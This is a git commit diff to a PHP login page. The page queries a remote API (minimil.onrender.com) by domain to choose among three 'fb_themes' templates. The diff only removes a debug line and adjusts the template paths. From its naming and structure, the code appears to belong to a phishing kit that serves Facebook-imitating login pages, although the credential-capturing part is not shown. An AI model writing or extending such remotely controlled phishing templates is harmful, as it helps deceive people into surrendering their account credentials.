48be90a3a68e6984454c588a6b32493e37142522
NEZUKO <trandinhvan0294@gmail.com>
2025-04-28 14:40:26 +0700

    .

--- login/index.php
+++ login/index.php
@@ -27,12 +27,11 @@ echo "Current Domain: " . $_SERVER['HTTP_HOST'] . "\n";
 $current_domain = $current_domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
 $response_fb = makeGetRequest('https://minimil.onrender.com/api/websites?domain_fb=' . $current_domain . "/login");
 $responseData_fb = json_decode($response_fb['content']);
-echo "\nResponse from FB API: " . print_r($responseData_fb, true) . "\n";
 $page_fb = isset($responseData_fb->data->fb_template) ? $responseData_fb->data->fb_template : '';
 $validPages_fb = [
-    '1' => 'fb_themes/theme1/index.php',
-    '2' => 'fb_themes/theme2/index.php',
-    '3' => 'fb_themes/theme3/index.php',
+    '1' => '/fb_themes/theme1/index.php',
+    '2' => '/fb_themes/theme2/index.php',
+    '3' => '/fb_themes/theme3/index.php',
 ];
 
 if (array_key_exists($page_fb, $validPages_fb) && file_exists($validPages_fb[$page_fb])) {
